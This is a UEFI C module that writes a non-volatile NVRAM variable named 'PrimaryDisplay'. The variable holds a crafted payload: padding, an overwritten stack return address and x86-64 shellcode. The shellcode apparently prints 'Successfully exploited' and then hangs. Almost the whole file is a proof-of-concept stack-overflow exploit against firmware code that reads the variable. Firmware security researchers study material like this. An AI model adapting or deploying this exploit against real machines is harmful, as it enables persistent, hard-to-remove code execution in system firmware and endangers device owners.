#include <Uefi.h>
#include <Library/DebugLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>

EFI_GUID gEfiGenericVariableGuid = {0x59d1c24f, 0x50f1, 0x401a, {0xb1, 0x01, 0xf3, 0x3e, 0x0d, 0xae, 0xd4, 0x43}};

/**
 * @brief The module entry point.
 */
EFI_STATUS
EFIAPI
SetPrimaryDisplayEntryPoint(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS Status;
    UINTN DataSize = 145;
    UINT8 Data[] = {
        // some data (40 bytes)
        0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
        0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
        0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
        0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
        0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
        // shellcode address on stack (return address for parent function)
        0x00, 0x35, 0xea, 0x07, 0x00, 0x00, 0x00, 0x00,
        // shellcode start
        0xb8, 0x18, 0xe0, 0x9e, 0x07, 0xba, 0x02, 0x00,
        0x00, 0x00, 0x4c, 0x8b, 0x40, 0x40, 0x4c, 0x89,
        0xc1, 0x41, 0xff, 0x50, 0x28, 0xb8, 0x18, 0xe0,
        0x9e, 0x07, 0xba, 0x31, 0x35, 0xea, 0x07, 0x4c,
        0x8b, 0x40, 0x40, 0x4c, 0x89, 0xc1, 0x41, 0xff,
        0x50, 0x08, 0xeb, 0xfc, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x53, 0x00, 0x75, 0x00, 0x63, 0x00, 0x63,
        0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x66,
        0x00, 0x75, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79,
        0x00, 0x20, 0x00, 0x65, 0x00, 0x78, 0x00, 0x70,
        0x00, 0x6c, 0x00, 0x6f, 0x00, 0x69, 0x00, 0x74,
        0x00, 0x65, 0x00, 0x64, 0x00, 0x10, 0x00, 0x00,
        0x00};

    Status = gRT->SetVariable(L"PrimaryDisplay",
                              &gEfiGenericVariableGuid,
                              EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
                              DataSize,
                              &Data);

    DebugPrint(DEBUG_INFO,
               "Setting PrimaryDisplay variable: GUID = %g, Size = %08x, Status = %r\n",
               gEfiGenericVariableGuid,
               DataSize,
               Status);

    return Status;
}

/**
 * @brief Handles unload request of this module.
 */
EFI_STATUS
EFIAPI
SetPrimaryDisplayUnload(
    IN EFI_HANDLE ImageHandle)
{
    return EFI_SUCCESS;
}
